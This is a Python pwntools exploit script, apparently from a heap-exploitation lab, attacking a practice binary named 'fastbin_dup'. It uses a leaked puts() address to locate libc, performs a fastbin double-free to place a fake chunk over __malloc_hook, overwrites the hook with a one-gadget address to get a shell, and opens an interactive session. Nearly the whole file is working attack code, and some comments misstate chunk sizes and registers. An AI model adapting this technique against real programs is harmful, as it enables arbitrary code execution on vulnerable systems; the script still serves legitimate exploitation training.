#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("fastbin_dup")
libc = elf.libc

gs = '''
continue
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)

# Index of allocated chunks.
index = 0

# Select the "malloc" option; send size & data.
# Returns chunk index.
def malloc(size, data):
    global index
    io.send(b"1") # select 1
    io.sendafter(b"size: ", f"{size}".encode())
    io.sendafter(b"data: ", data)
    io.recvuntil(b"> ") # reach > again for prompt
    index += 1
    log.info(f"chunk number {index}")
    return index - 1


# Select the "free" option; send index.
def free(index):
    io.send(b"2")
    io.sendafter("index: ", f"{index}".encode())
    io.recvuntil(b"> ")

io = start()

# This binary leaks the address of puts(), use it to resolve the libc load address.
io.recvuntil("puts() @ ")
libc.address = int(io.recvline(), 16) - libc.sym.puts
io.timeout = 0.1
log.info(f"libc address: {libc.address}")

# =============================================================================

# =-=-=- EXAMPLE -=-=-=

# Set the username field.
# I choose this specific username to trick malloc that the fake chunk is of size 0x20
username = b"/bin/sh\0"


io.sendafter("username: ", username)
io.recvuntil("> ")

# Request two 0x30-sized chunks and fill them with data.
chunk_A = malloc(0x68, b"A"*0x68)
chunk_B = malloc(0x68, b"B"*0x68)

# Free the first chunk, then the second.
# Head of 0x30 fastbin: chunkA
free(chunk_A)

# Head of 0x30 fastbin: chunkB
free(chunk_B)

# fastbins are LIFO based, non circular, singly linked lists
# malloc will walkthrough the 0x30 fastbin, ChunkB will be the head, pointting to ChunkA.
# malloc will make the freed chunk - chunkA be the head of the list, pointing to chunkB, thus making the list circular.
free(chunk_A)

# The next allocation will allow us to get a pointer to chunkA (the head of the list), while it is still in the free list (pointed by chunkB).
# We override chunkA's fd pointer with the address of the target
# at libc.sym.__malloc_hook-0x20-0x03 location we can craft a legal chunk size of 0x7f (0x70 with all the flags being set)

chunkA = malloc(0x68, p64(libc.sym.__malloc_hook-0x20-0x03))

chunkB = malloc(0x68, b"X")

chunkA = malloc(0x68, b"Y")

# 0xe1fa1 is the gadget offset
# Our constrain is [esp+0x50] == NULL
# [esp+50] is being passed to execve as the second argument which represent the argv array for program to be invoked.
# Though [esp+50] is not NULL, it is a valid pointer, pointing to some string.
# Fortunately, argv[0] is being ignored by /bin/sh, and the second argument ([esp+0x50+0x08], ie. argv[1]) is NULL.
# So this should work.

# go 0x10 beyond current chunk start to reach the first quadword of user data.
# go 0x03 bytes more to override the __malloc_hook pointer

malloc_hook_override = malloc(0x68, b"A" * (0x03+0x10) + p64(libc.address + 0xe1fa1))

# At this point, the allocation size doesn't matter from malloc perspective. We just have to pass the program limitation (chunksize < 120)

#malloc(1, b"")

# =============================================================================

io.interactive()
